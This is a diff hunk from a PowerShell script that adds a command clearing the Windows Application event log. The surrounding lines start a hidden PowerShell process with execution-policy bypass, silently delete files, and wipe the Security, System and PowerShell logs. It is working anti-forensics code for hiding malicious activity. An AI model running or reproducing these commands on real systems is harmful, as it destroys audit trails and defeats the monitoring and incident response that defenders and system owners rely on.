@@ -176,6 +176,7 @@ Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-w", "hidde
 Remove-Item -Path $initFindePath -Force -ErrorAction SilentlyContinue
 wevtutil cl Security
 wevtutil cl System 
+wevtutil cl Application
 wevtutil cl "Windows Powershell"
 Clear-EventLog -LogName "Windows PowerShell"
 Remove-Item -Path $f -Force -ErrorAction SilentlyContinue
